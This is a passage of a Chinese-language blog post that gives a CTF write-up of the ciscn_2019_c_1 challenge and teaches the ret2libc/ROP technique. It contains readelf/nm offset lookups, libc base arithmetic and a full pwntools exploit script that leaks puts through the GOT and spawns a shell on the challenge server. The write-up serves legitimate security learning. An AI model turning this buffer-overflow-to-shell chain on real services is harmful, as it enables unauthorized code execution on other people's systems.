+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">└─$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts                                                     </span><br><span class="line">   530: 0000000000112760   770 FUNC    GLOBAL DEFAULT   16 putsgent@@GLIBC_2.10</span><br><span class="line">   820: 0000000000075dd0   418 FUNC    WEAK   DEFAULT   16 fputs@@GLIBC_2.2.5</span><br><span class="line">   972: 00000000001110b0  1360 FUNC    GLOBAL DEFAULT   16 putspent@@GLIBC_2.2.5</span><br><span class="line">  1461: 0000000000077640   530 FUNC    WEAK   DEFAULT   16 puts@@GLIBC_2.2.5</span><br><span class="line">  1470: 0000000000077640   530 FUNC    GLOBAL DEFAULT   16 _IO_puts@@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">└─$ nm -D /usr/lib/x86_64-linux-gnu/libc.so.6 | grep puts</span><br><span class="line">0000000000075dd0 W fputs@@GLIBC_2.2.5</span><br><span class="line">0000000000080660 W fputs_unlocked@@GLIBC_2.2.5</span><br><span class="line">0000000000075dd0 T _IO_fputs@@GLIBC_2.2.5</span><br><span class="line">0000000000077640 T _IO_puts@@GLIBC_2.2.5</span><br><span class="line">0000000000077640 W puts@@GLIBC_2.2.5</span><br><span class="line">0000000000112760 T putsgent@@GLIBC_2.10</span><br><span class="line">00000000001110b0 T putspent@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>readelf查看 <strong>ELF</strong> <strong>文件的符号表</strong>，其中列出了 <code>libc.so.6</code> 中的所有全局函数和数据。它表示<code>puts()</code> 是一个 <strong>弱符号（WEAK）</strong>，地址是 <code>0000000000077640</code>。</p>
+</li>
+<li><p>nm 查看<strong>动态符号表</strong> 中的符号，包括动态链接库中的符号。</p>
+</li>
+<li><p>由此得出puts()的偏移地址<code>0000000000077640</code>。</p>
+</li>
+</ul>
+<ol start="4">
+<li>计算<strong>libc基址</strong></li>
+</ol>
+<p>计算出结果为：<code>0x7ffff7dbf000</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">puts_leaked=<span class="number">0x7ffff7e36640</span></span><br><span class="line">puts_offset=<span class="number">0x77640</span></span><br><span class="line">libc_base = puts_leaked - puts_offset</span><br></pre></td></tr></table></figure>
+
+<p>验证下,刚好在，由此得出libc基址为<code>0x7ffff7dbf000</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; info proc mappings</span><br><span class="line">process 143698</span><br><span class="line">Mapped address spaces:</span><br><span class="line"></span><br><span class="line">          Start Addr           End Addr       Size     Offset  Perms  objfile</span><br><span class="line">            0x400000           0x402000     0x2000        0x0  r-xp   /home/pwn/桌面/ciscn_2019_c_1</span><br><span class="line">            0x601000           0x602000     0x1000     0x1000  r--p   /home/pwn/桌面/ciscn_2019_c_1</span><br><span class="line">            0x602000           0x603000     0x1000     0x2000  rw-p   /home/pwn/桌面/ciscn_2019_c_1</span><br><span class="line">      0x7ffff7dbc000     0x7ffff7dbf000     0x3000        0x0  rw-p   </span><br><span class="line">      0x7ffff7dbf000     0x7ffff7de5000    0x26000        0x0  r--p   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br><span class="line">      0x7ffff7de5000     0x7ffff7f3c000   0x157000    0x26000  r-xp   /usr/lib/x86_64-linux-gnu/libc.so.6</span><br></pre></td></tr></table></figure>
+
+<h4 id="2-计算后门代码偏移及地址"><a href="#2-计算后门代码偏移及地址" class="headerlink" title="2.计算后门代码偏移及地址"></a><strong>2.计算后门代码偏移及地址</strong></h4><p><strong>方法1——利用</strong><strong><code>LibcSearcher</code></strong></p>
+<blockquote>
+<p>这是针对CTF比赛所做的小工具，在泄露了Libc中的某一个函数地址后，常常为不知道对方所使用的操作系统及libc的版本而苦恼，常规方法就是挨个把常见的Libc.so从系统里拿出来，与泄露的地址对比一下最后12位。</p>
+</blockquote>
+<p>实际地址则是程序运行之后，函数在内存中的地址，是一个随机的基址加上libc里面函数的地址，当你后面用ROP时候，需要有个基址才能正确调用内存中的函数.</p>
+<p>接着利用puts函数来获取system和&#x2F;bin&#x2F;sh</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr = &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libcbase = &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><strong>方法2——一个个找</strong></p>
+<ol>
+<li>找system（）地址</li>
+</ol>
+<p>使用 <code>readelf</code> 或 <code>nm</code> 来查看 <code>libc.so.6</code> 中函数的偏移地址：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ readelf -s /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system</span><br><span class="line">  1513: 000000000004dab0    45 FUNC    WEAK   DEFAULT   16 system@@GLIBC_2.2.5</span><br><span class="line"></span><br><span class="line">└─$ nm -D /usr/lib/x86_64-linux-gnu/libc.so.6 | grep system                                                        </span><br><span class="line">000000000004dab0 T __libc_system@@GLIBC_PRIVATE</span><br><span class="line">0000000000148710 T svcerr_systemerr@GLIBC_2.2.5</span><br><span class="line">000000000004dab0 W system@@GLIBC_2.2.5</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>**<code>__libc_system</code><strong>：这是 <code>libc</code> 的内部实现版本，标记为 <code>GLIBC_PRIVATE</code>，只在库的内部使用。</strong><code>system</code>**：这是全局可访问的函数，标记为 <code>GLIBC_2.2.5</code>。</p>
+</li>
+<li><p>由此得出system的偏移地址<code>0x000000000004dab0</code>。</p>
+</li>
+</ul>
+<ol start="2">
+<li>找&#x2F;bin&#x2F;sh地址</li>
+</ol>
+<p>&#x2F;bin&#x2F;sh并不是一个符号表中的符号，而是一个<strong>字符串常量</strong>，嵌入在 <code>libc</code> 的数据段中，所以不能用redelf和nm来获得。可以使用pwntools获得。得到地址<code>0x197e34</code></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">libc = ELF(<span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">binsh_addr = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">——$ python3 t2.py</span><br><span class="line">[*] <span class="string">&#x27;/usr/lib/x86_64-linux-gnu/libc.so.6&#x27;</span></span><br><span class="line">    Arch:     amd64-<span class="number">64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line"><span class="number">0x197e34</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x2F;bin&#x2F;sh和system（）的地址为libc的基址加上它们各自的偏移</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">libc_base=</span><br><span class="line">system_offset=<span class="number">0x4dab0</span></span><br><span class="line">binsh_offset=<span class="number">0x197e34</span></span><br><span class="line">system_address =libc_base+system_offset</span><br><span class="line">binsh_address=libc_nase+binsh_offset</span><br></pre></td></tr></table></figure>
+
+<h3 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h3><p>前面已经：<em>实现溢出，获得后门函数地址</em>，接下来就是组合它们，使它们<em>可执行</em>。</p>
+<p><em>栈对齐</em>是ubuntu18后的一个机制，就是函数结束时候由于一些出入栈的操作导致栈地址不能向8位或16位对齐，需要对齐之后才能使用函数(timeout就是内存错误，有可能就是没有栈对齐)</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ret=<span class="number">0x400c84</span>   </span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br></pre></td></tr></table></figure>
+
+<p><strong>关于ret的值：</strong></p>
+<p>ret是一个返回地址，0x400c84是我<code>objdump -M intel -d &#39;./ciscn_2019_c_1&#39;</code>后找到的一个ret地址，前面</p>
+<p><code>ROPgadget --binary ciscn_2019_c_1 --only &#39;pop|ret&#39;</code> 得到的那个ret值<code>0x4006b9</code>也能用，但是它返回的shell一次只能执行一个指令（我执行完ls后它就结束了），换成<code>0x400c84</code>后就能一次执行完ls和cat flag。问题不大，选中能用的ret就可以了。</p>
+<p>虽说这个ret在这里只是一个补齐栈的作用，但如果是随意设置值，比如0x400001之类无意义的值，payload最后会出现红色的$符号，但是无法执行任何命令，或者是说无法回显命令执行结果。</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.003.7ax4tz6sod.webp"
+                       
+                 ></p>
+<p><strong>关于puts函数返回值的处理：</strong></p>
+<p>puts输出会将\x00作为截断字符，假设函数地址后面3个字节为0，接收8个字节就会将函数地址后面输出的3个字节当做函数地址的最后3个字节，导致函数地址不正确，LibcSearcher对比的是最后12位，自然找不到正确的Libc</p>
+<p>完整的payload如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29552</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>) </span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">main_addr = <span class="number">0x400B28</span> </span><br><span class="line">pop_rdi = <span class="number">0x400C83</span>  </span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]   </span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]   </span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span> + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;Ciphertext\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(p.recvuntil(<span class="string">&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line">log.success(<span class="string">&#x27;puts_addr = &#x27;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line">libc = LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,puts_addr)</span><br><span class="line">libcbase = puts_addr - libc.dump(<span class="string">&#x27;puts&#x27;</span>)</span><br><span class="line">log.success(<span class="string">&#x27;libcbase = &#x27;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line"></span><br><span class="line">sys_addr = libcbase + libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh = libcbase + libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your choice!\n&#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">ret=<span class="number">0x400c84</span></span><br><span class="line">payload = <span class="string">b&#x27;1&#x27;</span>*<span class="number">0x58</span>+p64(ret)+p64(pop_rdi)+p64(bin_sh)+p64(sys_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Input your Plaintext to be encrypted\n&#x27;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>运行到第一个payload后会让你选择libc版本，选2.27的那个。因为题目提供的靶机是Ubuntu 18，而Ubuntu 18.04 稳定版本的 glibc 是2.27，可以在网上查到不同Ubuntu版本相对应的libc版本</p>
+<ul>
+<li>Ubuntu 18.04 LTS: glibc 2.27</li>
+</ul>
+<p>成功</p>
+<p><img  
+                       lazyload
+                       alt="image"
+                       data-src="https://arch3rn4r.github.io/picx-images-hosting/20240926/Aspose.Words.b29023ea-ea4d-4a54-8e76-4a1beff23b1c.004.77diw9ds94.webp"
+                       
+                 ></p>
+<blockquote>
+<p>一些报错</p>
+<p>BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See <a class="link"   target="_blank" rel="noopener" href="https://docs.pwntools.com/#bytes" >https://docs.pwntools.com/#bytes<i class="fas fa-external-link-alt"></i></a></p>
+<p>重新捋了一遍代码的运行逻辑，换了一下send数据的时机就好了</p>
+<p>LibcSearch模块缺失：第一次安装是安装作者写的方法 <code>python setup.py develop</code>,安装失败，然后改为直接<code>pip install libcsearch</code> ,安装成功</p>
+</blockquote>
+<h2 id="扩展知识"><a href="#扩展知识" class="headerlink" title="扩展知识"></a>扩展知识</h2><h3 id="x86-和-x86-64-的ROP差异"><a href="#x86-和-x86-64-的ROP差异" class="headerlink" title="x86 和 x86_64 的ROP差异"></a><strong>x86</strong> 和 x86_64 的ROP差异</h3><p>在 x86 和 x86_64 两种架构下、ROP 方法的 payload 组织方式有所不同：</p>
+<ul>
+<li><p>x86 非syscall:</p>
+<ul>
+<li><p>参数通过栈传递，因此一般无需pop和ret指令；</p>
+</li>
+<li><p>函数能直接访问在payload中预先防止放置的数据，是因为这数据作为些参数通过ebp被访问，而ebp会在函数prologue中设置</p>
+<ul>
+<li><p>prologue: <code>push ebp;mov ebp, esp</code></p>
+</li>
+<li><p>epilogue: <code>leave;ret</code></p>
+</li>
+</ul>
+</li>
+<li><p>组织形式：<code>FUNCTION ADDR</code> + <code>RETURN ADDR</code> + <code>ARGUMENT_0...N</code></p>
+<ul>
+<li>如果要实现执行多个函数，<code>RETURN ADDR</code>需要使用ROP gadget</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p>x86_64 非syscall:</p>
+<ul>
+<li><p>前6个参数依次<a class="link"   target="_blank" rel="noopener" href="https://stackoverflow.com/a/2538212/8706476" >通过寄存器传递<i class="fas fa-external-link-alt"></i></a>： RDI, RSI, RDX, RCX, R8, R9</p>
+</li>
+<li><p>gadget 均包含ret指令；</p>
+</li>
+<li><p>组织形式：<code>GADGET_0 ADDR</code> + <code>ARGUMENT_0</code> + <code>GADGET_1 ADDR</code> + … + <code>GADGET_N ADDR</code> + <code>ARGUMENT_N</code> + <code>FUNCTION ADDR</code></p>
+</li>
+</ul>
+</li>
+</ul>
+<h2 id="参考以及推荐"><a href="#参考以及推荐" class="headerlink" title="参考以及推荐"></a>参考以及推荐</h2><p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qinying001/article/details/103266763" >https://blog.csdn.net/qinying001/article/details/103266763<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="http://liul14n.top/2020/01/29/ciscn-2019-c-1/" >http://liul14n.top/2020/01/29/ciscn-2019-c-1/<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html" >https://systemoverlord.com/2017/03/19/got-and-plt-for-pwning.html<i class="fas fa-external-link-alt"></i></a></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://kayoch1n.github.io/blog/buuoj-pwn-rop-ciscn_2019_c_1/" >https://kayoch1n.github.io/blog/buuoj-pwn-rop-ciscn_2019_c_1/<i class="fas fa-external-link-alt"></i></a></p>
+
+                    
+                </div>
+
+                
+                        
+<div class="post-copyright-info-container border-box">
+    <div class="copyright-info-content border-box">
+        <div class="copyright-info-top border-box">
+            <div class="copyright-post-title border-box text-ellipsis">
+                从ciscn_2019_c_1看ret2libc
+            </div>
+
+            <div class="copyright-post-link border-box text-ellipsis">
+                2024/09/26/从ciscn-2019-c-1看ret2libc/
+            </div>
+        </div>
+
+        <div class="copyright-info-bottom border-box">
+            <div class="copyright-post-author bottom-item">
+                <div class="type">
+                    作者
+                </div>
+                <div class="content">arch3rn4r</div>
+            </div>
+
+            <div class="post-time bottom-item">
+                <div class="type">
+                    发布于
+                </div>
+                <div class="content">2024-09-26 14:25</div>
+            </div>
+
+
+            <div class="post-license bottom-item">
+                <div class="type">
+                    许可
+                </div>
+                <div class="content tooltip" data-tooltip-content="CC BY-NC-SA 4.0">
+                    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh-hans" target="_blank">
+                        
+                            <i class="fa-brands fa-creative-commons"></i>
+                            <i class="fa-brands fa-creative-commons-by"></i>
+                            <i class="fa-brands fa-creative-commons-nc"></i>
+                            <i class="fa-brands fa-creative-commons-sa"></i>
+                        
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <i class="copyright-bg fa-solid fa-copyright"></i>
+    </div>
+    <div class="copy-copyright-info flex-center tooltip" data-tooltip-content="复制版权信息" data-tooltip-offset-y="-2px">
+        <i class="fa-solid fa-copy"></i>
+    </div>
+</div>
+
+                
+
+                <div class="post-bottom-tags-and-share border-box">
+                    <div>
+                        
+                    </div>
+                    <div>
+                        
+                            <div class="post-share-container border-box">
+    <ul class="share-list-wrap border-box">
+        <li class="qq share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到 QQ"
+        >
+            <i class="fa-brands fa-qq"></i>
+        </li>
+        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
+            data-tooltip-content="分享到微信"
+            data-tooltip-img-tip="微信扫一扫"
+            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
+        >
+            <i class="fa-brands fa-weixin"></i>
+        </li>
+        <li class="weibo share-item border-box flex-center tooltip"
+            data-tooltip-content="分享到微博"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/01/04/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%BC%80%E5%8F%911/"
+                                   title="恶意软件开发前置"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">恶意软件开发前置</span>
+                                        <span class="post-nav-item">上一篇</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2024/09/24/%E7%AE%80%E5%8D%95hook%E4%B8%80%E4%B8%8B/"
+                                   title="简单hook一下"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">简单hook一下</span>
+                                        <span class="post-nav-item">下一篇</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+    <div class="comments-container border-box">
+        <div id="comments-anchor" class="comment-area-title border-box">
+            <i class="fas fa-comments"></i>&nbsp;评论
+        </div>
+        <div class="comment-plugin-fail border-box">
+    <span class="fail-tip">评论插件加载失败</span>
+    <button class="reload keep-button">点击重新加载</button>
+</div>
+<div class="comment-plugin-loading flex-center border-box">
+    <i class="loading-icon fa-solid fa-spinner fa-spin"></i>
+    <span class="load-tip">正在加载评论插件</span>
+</div>
+<script data-pjax>
+  window.KeepCommentPlugin = {}
+  window.KeepCommentPlugin.hideLoading = () => {
+    const cplDom = document.querySelector('.comments-container .comment-plugin-loading')
+    cplDom.style.display = 'none'
+  }
+  window.KeepCommentPlugin.loadFailHandle = () => {
+    window.KeepCommentPlugin.hideLoading()
+    const cpfDom = document.querySelector('.comments-container .comment-plugin-fail')
+    cpfDom.style.display = 'flex'
+    cpfDom.querySelector('.reload').addEventListener('click', () => {
+      window.location.reload()
+    })
+  }
+</script>
+
+        
+            
+
+    <div class="giscus-comments-container">
+        <div class="giscus" id="giscus"></div>
+        <script 
+                onerror="window.KeepCommentPlugin.loadFailHandle()"
+        >
+          if (!window.KeepCommentPlugin?.getGiscusTheme) {
+            window.KeepCommentPlugin.getGiscusTheme = () => {
+              return document.documentElement.classList.contains('dark-mode') ? 'dark_dimmed' : 'light_tritanopia'
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.changeGiscusTheme) {
+            window.KeepCommentPlugin.changeGiscusTheme = () => {
+              const iframe = document.querySelector('iframe.giscus-frame')
+              iframe && iframe.contentWindow.postMessage({
+                giscus: {
+                  setConfig: {
+                    theme: window.KeepCommentPlugin.getGiscusTheme()
+                  }
+                }
+              }, 'https://giscus.app')
+            }
+          }
+
+          if (!window.KeepCommentPlugin?.initGiscus) {
+            window.KeepCommentPlugin.initGiscus = () => {
+              const script = document.createElement('script')
+              script.async = true
+              script.src = 'https://giscus.app/client.js'
+              script.setAttribute('data-repo', 'arch3rn4r/arch3rn4r.github.io')
+              script.setAttribute('data-repo-id', 'R_kgDOLnMFhw')
+              script.setAttribute('data-category', 'Announcements')
+              script.setAttribute('data-category-id', 'DIC_kwDOLnMFh84Cik-D')
+              script.setAttribute('data-reactions-enabled', '0')
+              script.setAttribute('data-lang', 'zh-CN')
+              script.setAttribute('data-mapping', 'pathname')
+              script.setAttribute('data-strict', '0')
+              script.setAttribute('data-emit-metadata', '0')
+              script.setAttribute('data-input-position', 'top')
+              script.setAttribute('crossorigin', 'anonymous')
+              script.setAttribute('loading', 'lazy')
+              script.setAttribute('data-theme', window.KeepCommentPlugin.getGiscusTheme())
+              document.querySelector('.giscus-comments-container').appendChild(script)
+              script.onerror = () => {
+                window.KeepCommentPlugin.loadFailHandle()
+              }
+              script.onload = () => {
+                window.KeepCommentPlugin.hideLoading()
+              }
+              const toggleThemeBtn = document.querySelector('.tool-toggle-theme-mode')
+              toggleThemeBtn && toggleThemeBtn.addEventListener('click', () => {
+                window.KeepCommentPlugin.changeGiscusTheme()
+              })
+            }
+          }
+
+          if ('false' === "true") {
+            setTimeout(() => {
+              window.KeepCommentPlugin.initGiscus()
+            }, 1000)
+          } else {
+            window.addEventListener("DOMContentLoaded", window.KeepCommentPlugin.initGiscus)
+          }
+        </script>
+    </div>
+
+
+        
+    </div>
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc left-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E5%88%86%E6%9E%90"><span class="nav-text">前置分析</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%BC%80%E5%A7%8B%E5%81%9A%E9%A2%98"><span class="nav-text">开始做题</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0%E6%80%9D%E8%B7%AF"><span class="nav-text">构造思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ret2libc%E5%92%8CROP"><span class="nav-text">ret2libc和ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E5%AF%BB%E6%89%BElibc%E5%BA%93%E5%9F%BA%E5%9D%80"><span class="nav-text">1.寻找libc库基址</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E8%AE%A1%E7%AE%97%E5%90%8E%E9%97%A8%E4%BB%A3%E7%A0%81%E5%81%8F%E7%A7%BB%E5%8F%8A%E5%9C%B0%E5%9D%80"><span class="nav-text">2.计算后门代码偏移及地址</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9E%84%E9%80%A0payload"><span class="nav-text">构造payload</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%89%A9%E5%B1%95%E7%9F%A5%E8%AF%86"><span class="nav-text">扩展知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#x86-%E5%92%8C-x86-64-%E7%9A%84ROP%E5%B7%AE%E5%BC%82"><span class="nav-text">x86 和 x86_64 的ROP差异</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E4%BB%A5%E5%8F%8A%E6%8E%A8%E8%8D%90"><span class="nav-text">参考以及推荐</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+        &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2025
+        
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">arch3rn4r</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        由&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;驱动&nbsp;&&nbsp;主题&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+        <div class="count-info info-item">
+            
+                <span class="count-item border-box word">
+                    <span class="item-type border-box">总字数</span>
+                    <span class="item-value border-box word">78.1k</span>
+                </span>
+            
+
+            
+                <span class="count-item border-box uv">
+                    <span class="item-type border-box">访客数</span>
+                    <span class="item-value border-box uv" id="busuanzi_value_site_uv"></span>
+                </span>
+            
+
+            
+        </div>
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools left-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
